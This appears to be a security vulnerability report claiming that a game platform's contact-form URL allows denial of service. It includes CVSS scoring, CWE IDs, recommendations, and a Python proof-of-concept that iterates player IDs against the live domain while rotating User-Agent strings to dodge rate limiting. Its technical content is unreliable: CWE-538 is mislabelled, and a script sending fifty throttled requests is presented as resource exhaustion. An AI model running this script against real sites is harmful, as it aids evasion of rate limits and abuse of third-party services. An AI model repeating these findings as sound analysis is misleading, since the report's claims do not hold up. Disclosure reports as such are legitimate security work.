# Snookered
Giraffe games report.

### Report: DDoS Through Resource Exhaustion Due to Data Exposure in URLs

#### Vulnerability Overview:
**Vulnerability Name:** DDoS Through Resource Exhaustion Due to Data Exposure in URLs  
**Vulnerability Description:**  
The Giraffe Games platform is susceptible to a Denial-of-Service (DoS) attack through resource exhaustion due to data exposure in URLs. The vulnerability is present in the URL structure used in their contact forms, which exposes sensitive data, such as player names and IDs, allowing attackers to exploit this by sending a large volume of requests to the server, potentially causing the service to slow down or become unavailable. By modifying the `player_id` and `player_name` parameters and continuously making requests using automated scripts, attackers can bypass rate limits by using random user agents, leading to a resource exhaustion scenario.

**Affected URL:**  
`https://www.giraffe-games.com/contact/?player_name=<player_name>&game=Snooker%20Stars&player_id=<player_id>`

#### CVSS Score Calculation:
**Base Metrics:**
- **Attack Vector (AV):** Network (N)  
- **Attack Complexity (AC):** Low (L)  
- **Privileges Required (PR):** None (N)  
- **User Interaction (UI):** None (N)  
- **Scope (S):** Unchanged (U)  
- **Confidentiality (C):** None (N)  
- **Integrity (I):** None (N)  
- **Availability (A):** High (H)  

**CVSS Base Score:** 7.5 (High)  
This score is determined by the potential impact on availability with a low complexity attack vector and no privileges required.

#### CWE ID:
**CWE-538:** Insecure Handling of URL Parameters  
**CWE-400:** Uncontrolled Resource Consumption  

These CWEs represent the nature of the vulnerability. CWE-538 describes the insecure exposure of sensitive data via URLs, and CWE-400 covers the concept of resource exhaustion due to an uncontrolled input.

### Proof of Concept Script:
The following is a sample script in Python that uses the `requests` library to automate sending requests with randomized player IDs and User-Agents, bypassing rate limits:

```python
import requests
import random
import time

# URL structure
base_url = "https://www.giraffe-games.com/contact/?player_name=JonBonJohova&game=Snooker%20Stars&player_id="

# Random User-Agents to avoid rate limiting
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    # Add more User-Agents if needed
]

def send_requests():
    for i in range(79049750, 79049800):  # Range of player IDs
        player_id = str(i)
        url = base_url + player_id
        headers = {
            'User-Agent': random.choice(user_agents)  # Randomize User-Agent
        }
        
        try:
            response = requests.get(url, headers=headers)
            print(f"Request to {url} - Status Code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {e}")
        
        time.sleep(1)  # Delay to avoid overwhelming the server too quickly

if __name__ == "__main__":
    send_requests()
```

### Description of the Script:
- **Base URL:** The script uses the provided base URL structure and modifies the `player_id` parameter within a specific range.
- **Random User-Agents:** To bypass rate limits, it cycles through a list of random User-Agents.
- **Request Sending:** The script sends GET requests to the server and prints the status code for each request.
- **Time Delay:** A time delay of 1 second between requests is added to prevent immediate detection, but this can be adjusted.

### Recommendations:
1. **Rate Limiting:** Implement proper rate limiting on the server-side that takes into account IP addresses, not just User-Agents.
2. **Input Validation:** Ensure that the `player_id` and `player_name` parameters are validated, and unnecessary data is not exposed in URLs.
3. **CAPTCHA Implementation:** Consider adding CAPTCHAs for sensitive endpoints that can be exploited.
4. **Logging & Monitoring:** Implement logging and monitoring to detect and mitigate large-scale automated requests.

---

This report outlines the vulnerability, provides a CVSS score, and includes a CWE ID related to the issue. The script demonstrates how an attacker might exploit this vulnerability. Implementing the recommended mitigations will help in reducing the risk.
